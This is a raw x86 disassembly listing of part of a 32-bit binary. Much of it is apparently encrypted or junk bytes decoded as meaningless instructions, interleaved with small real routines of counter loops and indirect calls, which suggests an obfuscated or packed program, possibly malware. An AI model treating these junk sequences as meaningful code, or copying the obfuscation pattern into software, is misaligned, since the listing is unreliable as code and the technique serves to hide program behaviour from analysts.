  40e9fa:	nop
  40e9fb:	or     cl,ah
  40e9fd:	scas   eax,DWORD PTR es:[edi]
  40e9fe:	enter  0x3478,0xec
  40ea02:	daa    
  40ea03:	mov    dh,0xce
  40ea05:	push   eax
  40ea06:	fcmovnu st,st(1)
  40ea08:	push   cs
  40ea09:	aam    0x44
  40ea0b:	xor    dl,BYTE PTR [ebp+0x604be646]
  40ea11:	in     al,dx
  40ea12:	dec    eax
  40ea13:	call   0x3b32:0xe43d6b52
  40ea1a:	ret    
  40ea1b:	test   eax,0x46212187
  40ea20:	mov    ebx,0xd2624cf
  40ea25:	(bad)  
  40ea26:	sub    dl,BYTE PTR [ebx]
  40ea28:	(bad)  
  40ea29:	push   es
  40ea2a:	fldenv [ecx]
  40ea2c:	std    
  40ea2d:	sub    eax,0x2119253a
  40ea32:	js     0x40ea32
  40ea34:	or     al,BYTE PTR [edx+eiz*2+0xd7666ca]
  40ea3b:	adc    ah,bh
  40ea3d:	clc    
  40ea3e:	mov    esi,0x2552618c
  40ea43:	or     cl,bl
  40ea45:	outs   dx,DWORD PTR ds:[esi]
  40ea46:	js     0x40ea85
  40ea48:	lods   al,BYTE PTR ds:[esi]
  40ea49:	xchg   ecx,eax
  40ea4a:	mov    cl,al
  40ea4c:	cmp    BYTE PTR [esi-0x55],0x2d
  40ea50:	mov    dh,0x5a
  40ea52:	int3   
  40ea53:	fs jb  0x40ea8a
  40ea56:	mov    dl,0x26
  40ea58:	inc    ebp
  40ea59:	sti    
  40ea5a:	jo     0x40ea66
  40ea5c:	push   cs
  40ea5d:	in     al,0xdb
  40ea5f:	mov    eax,0x81bc163c
  40ea64:	fimul  DWORD PTR [ebx]
  40ea66:	xlat   BYTE PTR ds:[ebx]
  40ea67:	sti    
  40ea68:	xchg   esi,eax
  40ea69:	sbb    DWORD PTR [esi],esp
  40ea6b:	dec    eax
  40ea6c:	jno    0x40ea42
  40ea6e:	xchg   edx,eax
  40ea6f:	sbb    esi,DWORD PTR [ebp-0x20]
  40ea72:	int3   
  40ea73:	jne    0x40eae2
  40ea75:	pop    ebx
  40ea76:	pop    ss
  40ea77:	push   es
  40ea78:	cmp    BYTE PTR [edx+0x4256362f],bh
  40ea7e:	fwait
  40ea7f:	mov    ch,0xb4
  40ea81:	cmp    bl,al
  40ea83:	inc    edx
  40ea84:	aas    
  40ea85:	(bad)  
  40ea86:	jno    0x40ea1c
  40ea88:	ret    0xae17
  40ea8b:	adc    al,0x1c
  40ea8d:	push   ebp
  40ea8e:	xlat   BYTE PTR ds:[ebx]
  40ea8f:	gs push 0xfffffff2
  40ea92:	mov    al,0x20
  40ea94:	dec    ebp
  40ea95:	fadd   QWORD PTR [edx-0x57]
  40ea98:	sbb    al,0x64
  40ea9a:	mov    eax,0x172f1461
  40ea9f:	jno    0x40eaa9
  40eaa1:	ja     0x40eaa5
  40eaa3:	inc    ecx
  40eaa4:	shl    edx,0x35
  40eaa7:	adc    BYTE PTR [ecx-0x7c71d89c],bl
  40eaad:	fcmovnbe st,st(7)
  40eaaf:	inc    ebp
  40eab0:	xchg   ecx,eax
  40eab1:	inc    esi
  40eab2:	mov    cl,0x3e
  40eab4:	inc    esi
  40eab5:	aad    0x9f
  40eab7:	in     eax,0xb7
  40eab9:	in     eax,0x45
  40eabb:	dec    ebp
  40eabc:	ja     0x40eb10
  40eabe:	mov    edx,0xc3038aa1
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ah,ch
  40ebb4:	cmp    esi,edx
  40ebb6:	setp   BYTE PTR [ebp+0x7f547e7e]
  40ebbd:	jle    0x40ec3d
  40ebbf:	pop    ecx
  40ebc0:	clc    
  40ebc1:	pop    DWORD PTR [esi+eiz*1]
  40ebc4:	scas   al,BYTE PTR es:[edi]
  40ebc5:	sbb    ebx,ebp
  40ebc7:	mov    al,ds:0x70465a1d
  40ebcc:	add    edi,DWORD PTR [edi+0x39f6c53a]
  40ebd2:	loop   0x40ebe9
  40ebd4:	inc    esi
  40ebd5:	data16 shl BYTE PTR [esi+esi*4-0x42b17c97],1
  40ebdd:	cmp    ecx,DWORD PTR [ecx+0x57]
  40ebe0:	push   es
  40ebe1:	dec    edx
  40ebe2:	mov    eax,0x7e61c3ec
  40ebe7:	add    ch,BYTE PTR [eax+0x5ade6011]
  40ebed:	daa    
  40ebee:	mov    ch,0xc
  40ebf0:	cmc    
  40ebf1:	ss cld 
  40ebf3:	scas   al,BYTE PTR es:[edi]
  40ebf4:	jbe    0x40ec0b
  40ebf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebf7:	sub    eax,0xc86e1521
  40ebfc:	mov    eax,0xb073347b
  40ec01:	(bad)  
  40ec02:	mov    ecx,0xfb139a85
  40ec07:	xchg   esi,eax
  40ec08:	and    eax,0x5b19712
  40ec0d:	pop    ss
  40ec0e:	out    dx,al
  40ec0f:	mov    ebx,cr5
  40ec12:	xchg   edi,eax
  40ec13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec14:	stc    
  40ec15:	push   ss
  40ec16:	sub    al,0x3d
  40ec18:	bnd jbe 0x40ebe5
  40ec1b:	repz jmp 0xfef3:0xb605bfdb
  40ec23:	push   esp
  40ec24:	scas   al,BYTE PTR es:[edi]
  40ec25:	(bad)  
  40ec27:	lahf   
  40ec28:	mov    dh,0xdc
  40ec2a:	sar    BYTE PTR [ebp-0x78b4d4fb],0xe1
  40ec31:	push   edi
  40ec32:	xor    al,0x9e
  40ec34:	idiv   BYTE PTR [edi+0x7b5a7abe]
  40ec3a:	test   eax,0x5ce7b5f1
  40ec3f:	in     eax,0xf
  40ec41:	push   ds
  40ec42:	sbb    al,0xff
  40ec44:	cdq    
  40ec45:	rcl    esi,0x63
  40ec48:	mov    edx,0x10fb8563
  40ec4d:	cmova  ebx,DWORD PTR [esi-0x597d289a]
  40ec54:	pop    edi
  40ec55:	shl    BYTE PTR [edx+0x49],cl
  40ec58:	les    edx,FWORD PTR [ecx-0x886c8a]
  40ec5e:	add    BYTE PTR [edx+0x2d9ad09f],ah
  40ec64:	inc    edi
  40ec65:	lods   al,BYTE PTR ds:[esi]
  40ec66:	pop    edi
  40ec67:	mov    ecx,0x6c214bd9
  40ec6c:	cmp    DWORD PTR [ecx],ecx
  40ec6e:	xchg   ebx,eax
  40ec6f:	sub    DWORD PTR [edx*4-0x50096f53],esp
  40ec76:	cmp    BYTE PTR [eax],dh
  40ec78:	and    BYTE PTR cs:[ecx+ecx*4+0x6b],al
  40ec7d:	ja     0x40ecc0
  40ec7f:	call   0x7a49:0x344db79f
  40ec86:	dec    edi
  40ec87:	mov    cl,0x44
  40ec89:	outs   dx,DWORD PTR ds:[esi]
  40ec8a:	pop    eax
  40ec8b:	cs (bad) 
  40ec8d:	adc    ebp,DWORD PTR [esi-0x7275dcee]
  40ec93:	xor    eax,DWORD PTR [ebx]
  40ec95:	outs   dx,DWORD PTR gs:[esi]
  40ec97:	mov    eax,ds:0x240cee0d
  40ec9c:	and    eax,0x5f5e7b99
  40eca1:	repnz rcr BYTE PTR [edi-0x54],1
  40eca5:	sub    al,0xed
  40eca7:	lahf   
  40eca8:	repnz mov ah,0x75
  40ecab:	mov    eax,0xba3c4e36
  40ecb0:	js     0x40ec90
  40ecb2:	pop    edi
  40ecb3:	sahf   
  40ecb4:	mov    ebx,0x3b528705
  40ecb9:	mov    edx,ebx
  40ecbb:	lea    ebx,[edi+0x48ca2a3c]
  40ecc1:	addr16 jbe 0x40ec60
  40ecc4:	sub    eax,0x677d8d9d
  40ecc9:	or     al,BYTE PTR [edi+0x59049b96]
  40eccf:	aas    
  40ecd0:	push   0xfffffff7
  40ecd2:	cli    
  40ecd3:	(bad)  
  40ecd4:	jl     0x40ecf0
  40ecd6:	adc    edx,DWORD PTR gs:[edx-0x7a]
  40ecda:	xchg   edx,eax
  40ecdb:	dec    esi
  40ecdc:	or     esp,DWORD PTR [ebx]
  40ecde:	pop    edi
  40ecdf:	jge    0x40ec89
  40ece1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ece2:	(bad)  
  40ece3:	mov    al,0xcd
  40ece5:	xchg   edi,eax
  40ece6:	inc    ecx
  40ece7:	mov    WORD PTR ds:0x49de1d92,?
  40eced:	call   0x4ff9b751
  40ecf2:	inc    esp
  40ecf3:	and    eax,0x37299c51
  40ecf8:	test   eax,0xe835881a
  40ecfd:	(bad)  
  40ecff:	mov    DWORD PTR [eax],ebx
  40ed01:	adc    eax,0x9d535792
  40ed06:	xor    BYTE PTR [edi],0x8a
  40ed09:	dec    ebx
  40ed0a:	mov    ebx,0xcb95be45
  40ed0f:	mov    edi,0x1125aefc
  40ed14:	sti    
  40ed15:	or     eax,0x9bbb96ed
  40ed1a:	mov    ?,WORD PTR [edx+0x74]
  40ed1d:	lods   al,BYTE PTR ds:[esi]
  40ed1e:	mov    esi,0xb9252aad
  40ed23:	fisttp DWORD PTR [edx+0x43]
  40ed26:	pop    ecx
  40ed27:	lock sub eax,0xc5ebd002
  40ed2d:	dec    edx
  40ed2e:	cmp    al,0x0
  40ed30:	add    BYTE PTR [eax-0x75],ah
  40ed33:	(bad)  [ebx-0x19]
  40ed36:	jg     0x40eda1
  40ed38:	pop    ds
  40ed39:	pop    esi
  40ed3a:	loop   0x40ed12
  40ed3c:	shr    bl,0x31
  40ed3f:	mov    edx,0xabc9644e
  40ed44:	and    cl,dh
  40ed46:	stos   BYTE PTR es:[edi],al
  40ed47:	add    BYTE PTR [ebx-0x6a601e87],cl
  40ed4d:	sbb    ch,bl
  40ed4f:	int3   
  40ed50:	xchg   esi,eax
  40ed51:	jbe    0x40edcc
  40ed53:	lock ror DWORD PTR [edi],0xb9
  40ed57:	xor    eax,0x602cae23
  40ed5c:	mov    edx,edx
  40ed5e:	adc    eax,0x8982058b
  40ed63:	mov    esp,0x7cd35fa9
  40ed68:	retf   
  40ed69:	adc    ecx,esi
  40ed6b:	mov    ch,0x52
  40ed6d:	and    ch,BYTE PTR ds:0x71e6feea
  40ed73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed74:	mov    WORD PTR [edx-0x14],?
  40ed77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed78:	mov    al,0x14
  40ed7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed7b:	inc    eax
  40ed7c:	out    dx,eax
  40ed7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed7e:	icebp  
  40ed7f:	aas    
  40ed80:	leave  
  40ed81:	adc    eax,0xfee31ee8
  40ed86:	repz mov edx,0x23ee4ce6
  40ed8c:	and    DWORD PTR [edx-0x57],ebp
  40ed8f:	mov    edx,0x345127e0
  40ed94:	in     eax,0xf0
  40ed96:	lock pop eax
  40ed98:	dec    esi
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x561187ef]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	dec    ebx
  40ee77:	loopne 0x40eeb8
  40ee79:	test   eax,0xc4cf0ff1
  40ee7e:	popa   
  40ee7f:	cvtpi2ps xmm6,QWORD PTR [eax]
  40ee82:	mov    eax,ds:0x39565937
  40ee87:	xchg   esp,eax
  40ee88:	jbe    0x40eee7
  40ee8a:	jo     0x40ee5d
  40ee8c:	test   DWORD PTR [ebx-0x4ec912b],esi
  40ee92:	xor    eax,0xc57e9312
  40ee97:	aaa    
  40ee98:	idiv   DWORD PTR [esi+0x654ff2a1]
  40ee9e:	xchg   ecx,eax
  40ee9f:	cmp    bh,BYTE PTR [eax]
  40eea1:	imul   eax,DWORD PTR [ebx],0x59ff017c
  40eea7:	xor    DWORD PTR [edx],edx
  40eea9:	scas   eax,DWORD PTR es:[edi]
  40eeaa:	inc    esp
  40eeab:	in     eax,0xea
  40eead:	in     eax,dx
  40eeae:	sub    BYTE PTR [edi+eax*4+0x3662efef],cl
  40eeb5:	sbb    eax,0x62ab6ab4
  40eeba:	add    eax,0x623b22f5
  40eebf:	(bad)  
  40eec0:	sahf   
  40eec1:	ret    0x8abf
  40eec4:	mov    dh,0x5f
  40eec6:	cmp    al,0x30
  40eec8:	mov    ch,0xd6
  40eeca:	mov    edx,0xec4444c9
  40eecf:	mov    ebp,0xf50d76fa
  40eed4:	and    ebx,DWORD PTR [ecx+0x52]
  40eed7:	ret    
  40eed8:	imul   esp,DWORD PTR [ecx-0x9],0xffffffb8
  40eedc:	sub    esp,DWORD PTR [ebx+0x2d]
  40eedf:	xchg   ecx,eax
  40eee0:	cmc    
  40eee1:	jg     0x40ef13
  40eee3:	enter  0xd1f3,0x2b
  40eee7:	mov    esp,0xef4d5be4
  40eeec:	mov    al,ds:0xd01d4c20
  40eef1:	mov    eax,0xa3d70a1b
  40eef6:	cwde   
  40eef7:	into   
  40eef8:	mov    ah,0xe4
  40eefa:	sar    bh,1
  40eefc:	imul   eax,edi,0x428e1e4
  40ef02:	xchg   ebp,eax
  40ef03:	inc    ecx
  40ef04:	inc    ecx
  40ef05:	jns    0x40ee91
  40ef07:	imul   esp,DWORD PTR [eax-0x53526a58],0x44
  40ef0e:	inc    edx
  40ef0f:	mov    ds:0x452b9daf,al
  40ef14:	jmp    0x99b5:0x8ef8377b
  40ef1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef1c:	rcl    edx,1
  40ef1e:	ss nop
  40ef20:	pop    ss
  40ef21:	dec    ecx
  40ef22:	mov    ebp,DWORD PTR ds:0x9958b976
  40ef28:	mov    ch,0x25
  40ef2a:	sbb    DWORD PTR [ecx-0x74],ebx
  40ef2d:	loop   0x40ef4d
  40ef2f:	ret    
  40ef30:	xchg   ebx,eax
  40ef31:	sbb    esp,DWORD PTR [ecx-0x25]
  40ef34:	(bad)  
  40ef35:	aam    0x43
  40ef37:	sbb    ebp,DWORD PTR [eax-0x6f4142f7]
  40ef3d:	pop    ss
  40ef3e:	adc    DWORD PTR [esi+ebp*4],eax
  40ef41:	pop    ds
  40ef42:	fistp  WORD PTR [edx]
  40ef44:	repnz dec ecx
  40ef46:	in     al,dx
  40ef47:	xlat   BYTE PTR ds:[ebx]
  40ef48:	dec    esi
  40ef49:	aad    0x53
  40ef4b:	mov    ds:0x621e32ba,eax
  40ef50:	sub    DWORD PTR [edi-0x4ba64bc7],esi
  40ef56:	jne    0x40ef39
  40ef58:	mov    ds:0xae48300c,al
  40ef5d:	or     al,ch
  40ef5f:	xchg   esp,eax
  40ef60:	nop
  40ef61:	mov    edi,0x6b88556d
  40ef66:	mov    al,0xac
  40ef68:	jg     0x40efd2
  40ef6a:	shl    BYTE PTR [eax],0x7d
  40ef6d:	and    DWORD PTR [ebp-0x25],edx
  40ef70:	repnz stos BYTE PTR es:[edi],al
  40ef72:	clc    
  40ef73:	pop    ss
  40ef74:	or     DWORD PTR [edx-0x74],0x16b8645a
  40ef7b:	je     0x40eff5
  40ef7d:	cmp    eax,edx
  40ef7f:	call   0x4774:0xe4d30390
  40ef86:	aas    
  40ef87:	jge    0x40efc0
  40ef89:	int3   
  40ef8a:	leave  
  40ef8b:	mov    ds:0x45eb6a3f,al
  40ef90:	jmp    0x3fd18eb1
  40ef95:	ins    BYTE PTR es:[edi],dx
  40ef96:	sub    bh,BYTE PTR [eax]
  40ef98:	pop    ds
  40ef99:	push   ebp
  40ef9a:	js     0x40eff9
  40ef9c:	pop    ds
  40ef9d:	mov    eax,0x91a9867f
  40efa2:	inc    esi
  40efa3:	dec    ebp
  40efa4:	das    
  40efa5:	lahf   
  40efa6:	out    0xbe,al
  40efa8:	leave  
  40efa9:	push   edi
  40efaa:	(bad)  
  40efab:	popf   
  40efac:	cli    
  40efad:	shr    dl,0xc5
  40efb0:	enter  0x60c9,0x25
  40efb4:	outs   dx,DWORD PTR ds:[esi]
  40efb5:	pop    eax
  40efb6:	and    DWORD PTR [eax],ecx
  40efb8:	xlat   BYTE PTR ds:[ebx]
  40efb9:	push   cs
  40efba:	jns    0x40efa8
  40efbc:	xor    eax,0x9ea2ca7b
  40efc1:	ds stos DWORD PTR es:[edi],eax
  40efc3:	ss clc 
  40efc5:	js     0x40efc6
  40efc7:	cmp    al,0x48
  40efc9:	lock in eax,0xd6
  40efcc:	dec    esp
  40efcd:	rcl    BYTE PTR [ebp+0x41],0xb0
  40efd1:	test   BYTE PTR [edi-0x415d0819],al
  40efd7:	call   0x83ab7dfc
  40efdc:	loopne 0x40ef74
  40efde:	mov    al,0xa0
  40efe0:	sbb    DWORD PTR [esp+edi*2-0x31],esp
  40efe4:	dec    eax
  40efe5:	sti    
  40efe6:	aam    0xc2
  40efe8:	adc    esi,DWORD PTR [ebx]
  40efea:	or     ecx,DWORD PTR [esi+ebx*4]
  40efed:	add    ebx,DWORD PTR [edi-0x483c8d4e]
  40eff3:	sbb    eax,ebx
  40eff5:	xchg   edx,eax
  40eff6:	sbb    eax,0x4ba7746a
  40effb:	mov    dh,ah
  40effd:	jecxz  0x40f079
  40efff:	loopne 0x40ef83
  40f001:	lds    esp,FWORD PTR [edi]
  40f003:	imul   ebx,DWORD PTR [edx-0x7f],0xffffffee
  40f007:	and    eax,0x4b8bdf7c
  40f00c:	fnstenv [eax+0x2d]
  40f00f:	cmp    eax,0x27f30572
  40f014:	scas   eax,DWORD PTR es:[edi]
  40f015:	cwde   
  40f016:	test   al,0xe6
  40f018:	or     ebp,DWORD PTR [ebx+0x44c7f548]
  40f01e:	dec    ebx
  40f01f:	daa    
  40f020:	adc    eax,0x632e135d
  40f025:	xor    ch,BYTE PTR es:[esi-0x43]
  40f029:	scas   eax,DWORD PTR es:[edi]
  40f02a:	pop    ebp
  40f02b:	cmp    eax,0x1de0d89b
  40f030:	mov    eax,ds:0x1680970b
  40f035:	push   0x91d62242
  40f03a:	ffree  st(2)
  40f03c:	push   esi
  40f03d:	outs   dx,BYTE PTR ds:[esi]
  40f03e:	dec    edi
  40f03f:	mov    esi,?
  40f041:	sbb    eax,0x15d03719
  40f046:	and    ebx,DWORD PTR [edi]
  40f048:	xchg   edx,eax
  40f049:	addr16 push ds
  40f04b:	mov    ds:0x2c45c2ac,eax
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x62521594,ebx
  40f076:	push   ecx
  40f077:	rcl    esi,cl
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	ret    
  40f081:	hlt    
  40f082:	pop    eax
  40f083:	push   0xedd9e777
  40f088:	retf   
  40f089:	in     eax,dx
  40f08a:	aas    
  40f08b:	sar    BYTE PTR [edx],cl
  40f08d:	push   eax
  40f08e:	out    dx,al
  40f08f:	sbb    al,0x12
  40f091:	addr16 pop ebp
  40f093:	mov    DWORD PTR ds:0xb3fcd6,eax
  40f099:	and    BYTE PTR es:[ebp-0x4e],ch
  40f09d:	fdivp  st(0),st
  40f09f:	aad    0x23
  40f0a1:	dec    ecx
  40f0a2:	fld    TBYTE PTR [eax+0x8]
  40f0a5:	das    
  40f0a6:	adc    ebx,DWORD PTR [ebp+0x26be6c69]
  40f0ac:	iret   
  40f0ad:	pop    ss
  40f0ae:	xor    bl,BYTE PTR [esi]
  40f0b0:	(bad)  
  40f0b1:	adc    eax,0x90b101a
  40f0b6:	imul   ebx,DWORD PTR [edx+0x3b],0x2c
  40f0ba:	fnsave [ebx+0xc]
  40f0bd:	and    DWORD PTR [esi+0x5],edx
  40f0c0:	jecxz  0x40f138
  40f0c2:	dec    eax
  40f0c3:	cld    
  40f0c4:	mov    ch,0xe9
  40f0c6:	fidiv  DWORD PTR [edi-0x5cd9f025]
  40f0cc:	aad    0xcc
  40f0ce:	mov    ch,0x20
  40f0d0:	test   BYTE PTR [esi+0x44],0x8b
  40f0d4:	ja     0x40f113
  40f0d6:	aam    0x26
  40f0d8:	push   ecx
  40f0d9:	dec    ebx
  40f0da:	mov    ds:0xed1b6574,al
  40f0df:	xchg   ecx,eax
  40f0e0:	or     DWORD PTR [edx-0x3fedd7ae],0xffffffa0
  40f0e7:	jmp    0x40f128
  40f0e9:	(bad)  [ebx]
  40f0eb:	pop    es
  40f0ec:	add    DWORD PTR [edx-0x50],edx
  40f0ef:	and    eax,0xae6a1eb2
  40f0f4:	xchg   ebp,eax
  40f0f5:	push   0xffffffe2
  40f0f7:	and    eax,0x413ec15a
  40f0fc:	leave  
  40f0fd:	div    DWORD PTR [ecx+0x18]
  40f100:	xchg   ecx,eax
  40f101:	sbb    eax,0xf2ecedcb
  40f106:	retf   0xd007
  40f109:	mov    ds:0x19645af7,eax
  40f10e:	sub    BYTE PTR [eax+0x68],0xc6
  40f112:	shr    BYTE PTR ds:0x438fc4ba,cl
  40f118:	push   ds
  40f119:	mov    esp,0x50c66f20
  40f11e:	mov    dh,0x1c
  40f120:	jns    0x40f107
  40f122:	mov    ds,edi
  40f124:	(bad)  
  40f125:	shl    BYTE PTR ds:0xdf34e29c,cl
  40f12b:	push   ecx
  40f12c:	ins    BYTE PTR es:[edi],dx
  40f12d:	add    eax,0xa33f9283
  40f132:	test   eax,0x922ff938
  40f137:	into   
  40f138:	jle    0x40f0db
  40f13a:	cmp    DWORD PTR [edi+eiz*1-0x4f92274c],esp
  40f141:	out    0xaf,eax
  40f143:	add    bl,BYTE PTR [ebp-0x29]
  40f146:	sbb    ebx,DWORD PTR [edx-0x614f2ae4]
  40f14c:	bswap  eax
  40f14e:	nop
  40f14f:	(bad)  
  40f150:	dec    esi
  40f151:	xchg   ecx,eax
  40f152:	fdiv   DWORD PTR [edx-0x684b35cd]
  40f158:	and    eax,0xafa09970
  40f15d:	cld    
  40f15e:	dec    ebp
  40f15f:	mov    bl,ah
  40f161:	mov    ebp,esp
  40f163:	shl    ah,0x6
  40f166:	iret   
  40f167:	cld    
  40f168:	mov    ah,0xc1
  40f16a:	into   
  40f16b:	inc    edx
  40f16c:	fld    TBYTE PTR [ecx]
  40f16e:	dec    eax
  40f16f:	xchg   DWORD PTR [ecx+0x7f508908],ebp
  40f175:	call   0x11091cb9
  40f17a:	aas    
  40f17b:	sub    esi,esp
  40f17d:	xchg   edx,eax
  40f17e:	xchg   edx,eax
  40f17f:	dec    ecx
  40f180:	cmp    ch,BYTE PTR [edi+0x3]
  40f183:	add    BYTE PTR [esi+0x7e35eb72],bl
  40f189:	dec    ebx
  40f18a:	xchg   ebp,eax
  40f18b:	or     dh,al
  40f18d:	cmp    eax,esp
  40f18f:	je     0x40f1fb
  40f191:	pop    eax
  40f192:	add    al,0x72
  40f194:	enter  0x7c4b,0x93
  40f198:	mov    DWORD PTR [ebx+0x27],eax
  40f19b:	add    dl,BYTE PTR [ebp+0x52]
  40f19e:	mov    DWORD PTR [ebx+edi*1],esp
  40f1a1:	xor    eax,0x18f9544d
  40f1a6:	das    
  40f1a7:	add    edx,DWORD PTR ds:0x17b97712
  40f1ad:	sbb    DWORD PTR [eax-0x18404869],0xfe0ed669
  40f1b7:	nop
  40f1b8:	jecxz  0x40f1e2
  40f1ba:	push   ss
  40f1bb:	jns    0x40f208
  40f1bd:	fldcw  WORD PTR [edi-0x7e]
  40f1c0:	or     cl,al
  40f1c2:	fisubr DWORD PTR [edi+0x216f8ba]
  40f1c8:	push   ss
  40f1c9:	ror    BYTE PTR [ebx],1
  40f1cb:	shr    dh,cl
  40f1cd:	jl     0x40f205
  40f1cf:	std    
  40f1d0:	adc    eax,0x13a4b362
  40f1d5:	push   esi
  40f1d6:	xchg   esp,eax
  40f1d7:	ins    DWORD PTR es:[edi],dx
  40f1d8:	mov    ds:0xeb534598,eax
  40f1dd:	rcr    DWORD PTR [ebx+eiz*2],1
  40f1e0:	hlt    
  40f1e1:	mov    edx,0x3041a88
  40f1e6:	mov    eax,ds:0x136b12d9
  40f1eb:	sahf   
  40f1ec:	add    esp,ebp
  40f1ee:	inc    ecx
  40f1ef:	adc    BYTE PTR [esi-0x5a],ah
  40f1f2:	mov    eax,DWORD PTR [esi-0x5d4d0825]
  40f1f8:	aad    0x15
  40f1fa:	mov    al,0xe2
  40f1fc:	inc    edx
  40f1fd:	nop
  40f1fe:	call   0x49dc828e
  40f203:	(bad)  
  40f204:	adc    DWORD PTR [edi],ecx
  40f206:	or     al,0xfc
  40f208:	cmp    dx,WORD PTR [edi+0x2431636c]
  40f20f:	xor    al,0xac
  40f211:	inc    edx
  40f212:	aam    0x62
  40f214:	push   esp
  40f215:	cmp    DWORD PTR [ecx-0xa],ebp
  40f218:	stos   DWORD PTR es:[edi],eax
